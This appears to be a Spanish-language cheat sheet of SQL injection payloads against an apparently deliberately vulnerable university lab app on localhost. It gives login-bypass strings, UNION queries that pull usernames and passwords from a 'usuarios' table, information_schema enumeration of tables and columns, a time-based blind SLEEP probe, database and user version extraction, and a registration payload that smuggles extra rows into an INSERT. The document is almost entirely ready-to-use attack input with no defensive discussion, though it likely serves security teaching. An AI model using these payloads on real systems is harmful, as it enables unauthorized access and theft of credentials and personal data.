## 1. Authentication Bypass (Bypass de Login)

### Método 1: Comentario SQL
```
Usuario: alejo'--
Contraseña: (cualquier cosa)
```

### Método 2: OR siempre verdadero
```
Usuario: ' OR 1=1 LIMIT 1 #
Contraseña: (vacío)
```

### Método 3: Inyección en contraseña
```
Usuario: alejo
Contraseña: ' OR '1'='1
```

---

## 2. Extracción de Datos con UNION

### Extraer usuarios y contraseñas
```
http://localhost:4000/dashboard?id=-1 UNION SELECT id,username,password,email,created_at,NULL,NULL,NULL,NULL,NULL FROM usuarios--
```

### Ver todos los estudiantes
```
http://localhost:4000/dashboard?id=1 OR 1=1
```

### Listar todas las tablas de la base de datos
```
http://localhost:4000/dashboard?id=-1 UNION SELECT 1,table_name,3,4,5,6,7,8,9,10 FROM information_schema.tables WHERE table_schema='universidad'--
```

---

## 3. Filtrado y Manipulación de Datos

### Filtrar estudiantes por semestre
```
http://localhost:4000/dashboard?id=1 OR semestre >= 6
```

### Filtrar cursos por créditos
```
http://localhost:4000/dashboard?id=1 OR numero_creditos >= 5
```

### Ver estadísticas de notas
```
http://localhost:4000/dashboard?id=-1 UNION SELECT 1,2,3,AVG(nota_final),MAX(nota_final),MIN(nota_final),7,8,9,10 FROM notas--
```

---

## 4. Ataques Avanzados

### Time-Based Blind SQL Injection
```
http://localhost:4000/dashboard?id=1 AND SLEEP(5)--
```
**Resultado:** La página tardará 5 segundos si es vulnerable.

### Extraer información del sistema
```
http://localhost:4000/dashboard?id=-1 UNION SELECT 1,database(),user(),version(),5,6,7,8,9,10--
```

### Ver columnas de una tabla específica
```
http://localhost:4000/dashboard?id=-1 UNION SELECT 1,column_name,data_type,4,5,6,7,8,9,10 FROM information_schema.columns WHERE table_name='usuarios'--
```

---

## 5. SQL Injection en Registro

### Crear múltiples usuarios a la vez
```
Username: hacker'), ('usuario2', 'pass123', 'user2@test.com
Password: cualquiera
Email: test@test.com
```

---
